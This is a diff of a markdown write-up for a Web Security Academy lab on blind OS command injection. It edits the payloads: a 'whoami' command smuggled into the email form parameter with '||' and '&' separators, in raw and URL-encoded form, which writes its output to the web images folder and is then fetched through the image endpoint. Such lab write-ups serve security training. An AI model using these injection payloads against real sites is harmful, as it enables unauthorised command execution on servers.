@@ -62,19 +62,18 @@ to execute, etc....
 
 But here in this lab it's gonna be:
 ```shell
-x||whoami > /var/www/images/whodatbe.txt||&
+x||whoami > /var/www/images/whodat.txt||&
 ```
 <br>
 
 ### The cmd injection in the email param
+be sure to URL encode it
 ```
-csrf=xxxxxxxxxJF&name=joe&email=foo@email.com & whoami > /var/www/images/output.txt #&subject=secondattempt&message=foobar
+email=foo%40email.com+%26+whoami+>+/var/www/images/whodat.txt+%23&subject
 ```
 
 Then URL encode it, I used the Decoder tab:
-```URL
-%78%7c%7c%77%68%6f%61%6d%69%20%3e%20%2f%76%61%72%2f%77%77%77%2f%69%6d%61%67%65%73%2f%77%68%6f%64%61%74%62%65%2e%74%78%74%7c%7c
-```
+
 
 Then the end point containing the .txt file you made is located at:
 ```HTTP
@@ -84,8 +83,8 @@ GET /image?filename=21.jpg
 It can be any jpg number, that's irrelevant, cause you're gonna change the .jpg file name
 to the name of the file you created that contains the output of `whoami` , and that will look like
 ```HTTP
-GET /image?filename=whodatbe.txt HTTP/2
-Host: 0a2f007903dd2e578305105c006200aa.web-security-academy.net
+GET /image?filename=whodat.txt HTTP/2
+Host: yourlabid.web-security-academy.net
 ```
 
 and the response should be
